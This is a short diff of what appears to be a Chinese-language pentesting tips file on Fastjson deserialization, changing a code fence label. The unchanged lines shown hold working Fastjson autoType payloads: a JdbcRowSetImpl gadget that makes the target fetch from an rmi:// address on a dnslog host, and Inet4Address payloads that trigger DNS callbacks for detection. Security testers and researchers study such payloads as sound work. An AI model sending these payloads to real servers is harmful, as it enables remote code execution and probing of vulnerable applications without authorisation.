@@ -19,7 +19,7 @@ tips:
     ```
 
     - 使用dnslog回显
-    ```json
+    ```text
     {"handsome":{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://xxx.dnslog.cn/aaa","autoCommit":true}}
     {"a":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}}
     {"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
